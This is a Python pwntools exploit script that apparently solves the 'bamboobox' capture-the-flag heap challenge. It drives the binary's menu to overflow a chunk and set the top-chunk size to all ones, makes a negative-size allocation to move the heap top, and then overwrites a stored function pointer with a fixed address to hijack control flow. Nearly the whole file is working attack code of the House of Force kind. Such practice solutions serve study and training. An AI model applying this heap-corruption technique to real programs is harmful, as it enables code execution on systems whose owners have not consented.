from pwn import *
import sys, os
context.log_level = 'debug'
prog = './bamboobox'
elf = ELF(prog)
p = process(prog)
libc = ELF("./libc-2.23.so")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()

def add(size, content):
	p.sendlineafter("Your choice:", '2')
	p.sendlineafter("name:", str(size))
	p.sendlineafter("item:", content)
def show():
	p.sendlineafter("Your choice:", '1')
def edit(idx, size, content):
	p.sendlineafter("Your choice:", '3')
	p.sendlineafter("index of item:", str(idx))
	p.sendlineafter("name:", str(size))
	p.sendafter("item:", content)
def free(idx):
	p.sendlineafter("Your choice:", '4')
	p.sendlineafter("index of item:", str(idx))
def exp():
	add(0x20, 'a')
	edit(0, 0x30, 'a'*0x20+p64(0)+p64(0xffffffffffffffff))
	add(-0x60, 'a')
	add(0x10, p64(0)+p64(0x400d49))
	dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
